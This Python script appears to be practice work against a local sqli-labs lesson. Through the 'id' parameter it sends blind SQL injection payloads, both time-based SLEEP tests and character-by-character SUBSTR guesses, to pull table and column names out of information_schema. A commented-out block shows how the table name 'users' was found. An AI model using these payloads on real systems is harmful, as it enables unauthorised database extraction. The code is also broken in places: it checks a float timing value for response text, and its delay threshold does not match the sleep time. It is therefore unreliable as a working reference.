import requests
import time

def find_column_name_length(url):
    column_name_length = 0
    for i in range(100): 
        payload = f" ' OR (SELECT IF(LENGTH((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_schema = 'security' AND TABLE_NAME = 'users' LIMIT 0,1)) = {i}, SLEEP(0.5), NULL)) --+"
        response_text = send_request(url, payload)
        print(response_text)
        if response_text > 5:
            column_name_length = i
            print(column_name_length)
            return column_name_length

def find(response_text, char):
    result = ""
    if "You are in..........." in response_text:
        result += char
    return result

def send_request(url, payload):
    target_url = url + "?id=" + payload
    response = requests.get(target_url)
    return response.elapsed.total_seconds()

url = "http://localhost:8080/Less-8"

column_name_length = find_column_name_length(url)

i = 0
found_pass = ""
while i < column_name_length:
    for char in "abcdefghijklmnopqrstuvwxyz":
        payload = f"' OR (SELECT SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema = 'security' AND table_name = 'users' LIMIT 0,1), {i+1}, 1) = '{char}') --+"
        response_text = send_request(url, payload)
        found = find(response_text, char)
        if found:
            found_pass += found
    i += 1

print(found_pass)


#found the tablename with this
# import requests

# def find_table_name_length(url):
#     table_name_length = 0
#     for i in range(100): 
#         payload = f"' OR LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema = 'security' LIMIT 3,2)) = {i} --+"
#         response_text = send_request(url, payload)
#         if "You are in..........." in response_text:
#             table_name_length = i
#             break
#     return table_name_length

# def send_request(url, payload):
#     target_url = url + "?id=" + payload
#     response = requests.get(target_url)
#     return response.text

# def find(response_text, i):
#     result = ""
#     if "You are in..........." in response_text:
#         result += i
#     return result

# url = "http://localhost:8080/Less-8"

# table_name_length = find_table_name_length(url)

# i = 0
# while i < table_name_length:
#     for char in "abcdefghijklmnopqrstuvwxyz":
#         payload = f"' OR (SELECT SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema = 'security' LIMIT 3,2), {i+1}, 1) = '{char}') --+"
#         response_text = send_request(url, payload)
#         print(find(response_text, char))
#     i += 1

# we got the table name as  "users"
